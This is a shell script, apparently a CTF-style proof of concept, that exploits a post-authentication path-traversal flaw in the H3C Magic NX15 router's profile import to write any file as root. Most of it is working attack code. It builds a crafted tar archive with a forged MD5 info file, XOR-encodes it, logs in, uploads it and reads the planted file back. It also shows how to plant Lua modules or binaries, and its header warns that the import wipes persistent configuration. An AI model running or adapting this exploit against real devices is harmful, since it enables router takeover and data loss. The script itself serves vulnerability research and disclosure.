#!/bin/sh
# H3C Magic NX15 V100R017 — post-auth arbitrary file write (root)
#
# Affected:  NX15V100R017  (esps.system.importprofile, reached via /api/upload?type=cfg)
# Type:      CWE-73 External Control of File Name or Path / CWE-22 Path Traversal
# Impact:    create/overwrite any file on the root filesystem as root
# CVSS 3.1:  AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H  (7.2)
#
# The method extracts an attacker-supplied tar with `cd / && tar -xzvf ...`, so
# member names are resolved relative to the root. The container is validated only
# by a product/version string and an MD5 that the attacker supplies. The payload
# is "encrypted" by a single-byte XOR with 0x55 (the whole of /usr/bin/file_encrypt).
#
# !!!  WARNING — the import runs `rm -rvf /mnt/config/*` as part of its NORMAL
# !!!  operation (this is what the feature does on every profile import, not an
# !!!  extra bug).  It wipes the PERSISTENT configuration layer (a jffs2 mount
# !!!  copied over /etc/config at boot), so the PoC is disruptive: the device
# !!!  keeps working until reboot, after which it may come up in the
# !!!  factory / setup-wizard state.  Only run this against a device you own or
# !!!  are explicitly authorised to test, and expect to reconfigure it afterwards.
#
# Usage
#   ./postauth_importprofile_arbitrary_file_write.sh http://192.168.124.1 '<admin>' [out_path] [content]
#
# Defaults: plant  XGCTF{}  at  www/download/flag.txt  (readable at /download/flag.txt)
#
# To plant something else, e.g. a Lua module or a system binary:
#   ./... http://192.168.124.1 '<admin>' usr/lib/lua/protol_cvt.lua "$(cat my.lua)"
#
# Recovering /mnt/config afterwards (verified method):
#   re-write every file of /etc/config back into /mnt/config/ via the
#   file.write RPC, encoding single quotes as \u0027 (see report §4).
set -e

TARGET="${1:-http://192.168.124.1}"
PASS="${2:?usage: $0 <target> <admin-password> [out_path] [content]}"
OUT="${3:-www/download/flag.txt}"
CONTENT="${4:-XGCTF{}}"

WORK=$(mktemp -d)
trap 'cd /; rm -rf "$WORK"' EXIT
cd "$WORK"

# 1) the file to plant (tar member path is relative; extraction happens at /)
mkdir -p "$(dirname "$OUT")"
printf '%s' "$CONTENT" > "$OUT"

# 2) inner archive
tar -czf NX15.tar.gz "$OUT"

# 3) NX15.info = "<software version> <md5(NX15.tar.gz)>"  (required by is_valid_cfg)
MD_TAR=$(md5sum NX15.tar.gz | cut -d' ' -f1)
printf 'NX15V100R017 %s\n' "$MD_TAR" > NX15.info

# 4) outer archive
tar -czf NX15_org.tar.gz NX15.tar.gz NX15.info

# 5) XOR 0x55 — self-inverse, the entirety of file_encrypt
perl -e 'local $/; print join("", map { chr(ord($_) ^ 0x55) } split //, <STDIN>)' \
     < NX15_org.tar.gz > NX15.cfg

CFG_MD5=$(md5sum NX15.cfg | cut -d' ' -f1)
CFG_SIZE=$(stat -c %s NX15.cfg)
echo "[*] NX15.cfg  ${CFG_SIZE} bytes  md5=${CFG_MD5}"

# 6) log in
T=$(curl -s -X POST -H 'Content-Type: application/json' \
     -d "{\"username\":\"H3C\",\"password\":\"$PASS\"}" \
     "$TARGET/api/login/auth" | sed -n 's/.*"session":"\([^"]*\)".*/\1/p')
[ -n "$T" ] || { echo "[!] login failed" >&2; exit 2; }
echo "[*] session=$T"

# 7) upload (type=cfg, a4=3 -> header validation skipped) and let importprofile run
curl -s -X POST -H "AUTHENTICATION: $T" --data-binary @NX15.cfg \
     "$TARGET/api/upload?type=cfg&chkSum=$CFG_MD5&fileSize=$CFG_SIZE&fileName=NX15.cfg"
echo
sleep 6

# 8) read back over HTTP (lighttpd passes /download/ straight through)
URL_PATH="/${OUT#www/}"
echo "[*] GET ${URL_PATH}:"
curl -s "$TARGET${URL_PATH}"; echo
